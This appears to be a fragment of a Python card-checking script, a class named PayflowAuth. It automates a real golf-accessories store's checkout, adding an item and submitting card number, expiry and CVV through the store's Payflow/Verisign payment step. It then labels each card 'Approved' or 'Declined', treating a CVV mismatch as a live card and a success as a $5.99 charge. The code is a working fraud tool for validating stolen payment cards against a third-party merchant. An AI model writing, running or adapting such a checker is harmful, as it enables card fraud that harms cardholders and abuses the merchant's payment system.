...
class PayflowAuth:
    def main(self, card):
        try:
            ...
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.diamondtour.com','referer': 'https://www.diamondtour.com/golf-accessories/head-covers/racer-driver-headcover.html','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'form_key': from_key,'product': '9161','related_product': '','super_attribute[559]': '732','qty': '1'}
            ...
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','referer': 'https://www.diamondtour.com/checkout/cart/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
            ...
            data = {'shipping_method': 'shippingmodule_flatwithmethod','form_key': from_key}
            ...
            data = {'payment[method]': 'verisign','payment[cc_type]': cctype,'payment[cc_number]': cc[0],'payment[cc_exp_month]': cc[1],'payment[cc_exp_year]': cc[2],'payment[cc_cid]': cc[3],'form_key': from_key}
            ...
            data = {'payment[method]': 'verisign','payment[cc_type]': cctype,'payment[cc_number]': cc[0],'payment[cc_exp_month]': cc[1],'payment[cc_exp_year]': cc[2],'payment[cc_cid]': cc[3],'form_key': from_key,'agreement[1]': '1'}
            ...
            if '"success":false' in response.text:
                ...
                if 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.' in msg: return 'Approved! ✅','CVV2 Mismatch: 15004'
                
                else: return 'Declined! ❌', msg
            
            else: return 'Approved! ✅','Charged! $5.99'

        except:return 'Decline! ❌','Declined: 15005-This transaction cannot be processed,'
